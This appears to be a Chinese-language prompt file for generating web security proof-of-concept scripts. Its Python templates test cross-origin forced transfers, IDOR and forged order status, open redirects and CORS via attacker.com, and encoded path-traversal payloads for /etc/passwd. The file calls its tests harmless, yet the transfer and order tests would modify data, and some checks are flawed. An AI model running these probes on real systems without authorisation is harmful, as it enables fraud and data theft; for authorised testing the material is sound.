---
description: 方案生成 - 基于原理的假设验证 POC
---

# Web POC 生成器 (POC Generator)

生成用于验证第一性原理假设的复现方案。

## 核心原则

**POC 不是攻击脚本，是假设验证工具**

- 证明结构性假设被打破，而非获取系统权限
- 无害化：证明影响存在但不破坏数据
- 可复现：任何人在相同条件下都能验证假设

## 按原理的 POC 模板

### 原理一：意志不确定性 POC
**验证假设**："用户可在不知情的情况下执行不可逆操作"

```python
import requests

TARGET = "http://target.com"
ATTACKER_DOMAIN = "http://attacker.com"

def test_will_uncertainty():
    """
    验证：跨域请求是否可携带凭证执行不可逆操作
    """
    # 1. 获取用户会话（模拟用户已登录）
    session = login_as_victim()
    
    # 2. 构造跨域诱导请求
    # 模拟从攻击者页面发起的请求
    malicious_request = {
        'url': f'{TARGET}/api/transfer',
        'method': 'POST',
        'data': {'to': 'attacker_account', 'amount': 100},
        'headers': {
            'Origin': ATTACKER_DOMAIN,  # 来自攻击者域
            'Referer': f'{ATTACKER_DOMAIN}/trap.html'
        }
    }
    
    # 3. 验证操作是否成功
    # 如果成功，证明意志确认机制缺失
    response = session.post(**malicious_request)
    
    # 4. 验证结果
    if response.status_code == 200 and 'success' in response.text:
        print("[+] 假设验证成功：跨域诱导可执行不可逆操作")
        print("    → 服务器未验证用户意志，仅验证凭证有效性")
        return True
    else:
        print("[-] 假设验证失败：存在跨域保护或意志确认")
        return False
```

**验证指标**：
- 是否携带 Cookie/Token？
- 是否触发了二次确认？
- 操作是否成功执行？

### 原理二：失忆困境 POC
**验证假设**："服务器依赖请求参数推断状态，而非查询实际状态"

```python
def test_amnesia_assumption():
    """
    验证：修改请求中的状态标记是否可欺骗服务器
    """
    session = login_as_user_A()
    
    # 测试1：资源所有权推断
    # 尝试访问用户B的资源
    resource_id = "B_resource_id"  # 不属于当前用户
    response = session.get(f'{TARGET}/api/resource/{resource_id}')
    
    if response.status_code == 200:
        print("[+] 假设验证成功：服务器未验证资源所有权")
        print("    → 仅基于请求中的ID推断可访问性")
    
    # 测试2：流程状态推断
    # 跳过中间步骤，直接提交"已完成"状态
    workflow_data = {
        'order_id': '123',
        'status': 'paid',  # 伪造状态
        'step': 'final'    # 跳过验证步骤
    }
    response = session.post(f'{TARGET}/api/order/complete', json=workflow_data)
    
    if response.status_code == 200:
        print("[+] 假设验证成功：服务器接受伪造的状态标记")
        print("    → 未验证前置步骤是否实际完成")
```

**验证指标**：
- 资源ID修改后是否仍能访问？
- 状态标记伪造后是否被接受？
- 服务器是否查询数据库验证实际状态？

### 原理三：信任重构 POC
**验证假设**："跨域信任边界可被重定向到攻击者控制域"

```python
def test_trust_reconstruction():
    """
    验证：跳转参数和CORS配置是否存在信任延伸漏洞
    """
    session = requests.Session()
    
    # 测试1：跳转劫持
    redirect_params = {
        'redirect_uri': 'https://attacker.com/callback',
        'next': 'https://attacker.com/landing'
    }
    
    for param, malicious_url in redirect_params.items():
        response = session.get(f'{TARGET}/oauth/authorize?{param}={malicious_url}')
        
        if malicious_url in response.url or 'location' in response.headers.get('location', ''):
            print(f"[+] 假设验证成功：{param} 可被重定向到攻击者域")
            print("    → 信任边界延伸至攻击者控制域")
    
    # 测试2：CORS 信任延伸
    headers = {
        'Origin': 'https://attacker.com'
    }
    response = session.get(f'{TARGET}/api/user/profile', headers=headers)
    
    acao = response.headers.get('Access-Control-Allow-Origin')
    acac = response.headers.get('Access-Control-Allow-Credentials')
    
    if acao == 'https://attacker.com' and acac == 'true':
        print("[+] 假设验证成功：CORS 允许攻击者域携带凭证访问")
        print("    → 跨域信任边界过于宽松")
```

**验证指标**：
- 跳转参数是否验证域名白名单？
- CORS 是否允许任意 Origin 携带凭证？
- postMessage 是否验证来源？

### 原理四：语义断层 POC
**验证假设**："安全层与执行层对输入的解释存在差异"

```python
def test_semantic_gap():
    """
    验证：同一输入的不同编码/格式是否导致不同处理结果
    """
    base_payload = '../../../etc/passwd'
    
    # 不同编码变体
    variants = {
        'raw': base_payload,
        'url_encode': '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        'double_url': '%252e%252e%252f%252e%252e%252f',
        'unicode': '..%c0%af..%c0%af..%c0%afetc/passwd',
        'mixed': '..%2f..%252f..%c0%afetc%2fpasswd'
    }
    
    results = {}
    for name, payload in variants.items():
        response = requests.get(f'{TARGET}/api/file?path={payload}')
        results[name] = {
            'status': response.status_code,
            'length': len(response.text),
            'blocked': 'error' in response.text or response.status_code == 403
        }
    
    # 分析差异
    blocked = [k for k, v in results.items() if v['blocked']]
    passed = [k for k, v in results.items() if not v['blocked']]
    
    if blocked and passed:
        print("[+] 假设验证成功：不同编码导致不同处理结果")
        print(f"    → 被阻止: {blocked}")
        print(f"    → 被接受: {passed}")
        print("    → 安全层与执行层解释不一致")
```

**验证指标**：
- 不同编码是否导致不同响应？
- 安全层拒绝但执行层接受的情况是否存在？
- 类型转换是否导致权限变化？

## 交付标准

1. **假设明确**：每个 POC 验证一个第一性原理假设
2. **无害化**：使用只读操作或逻辑探测，不修改/删除数据
3. **可观测**：响应差异能清晰证明假设是否成立
4. **可复现**：包含完整的上下文设置（登录、Token获取等）

## 输出

- **Assumption Verification Script**: 原理驱动的验证脚本
- **Evidence Package**: 请求/响应截图、差异对比
- **Conclusion Report**: 假设成立/不成立的证据分析
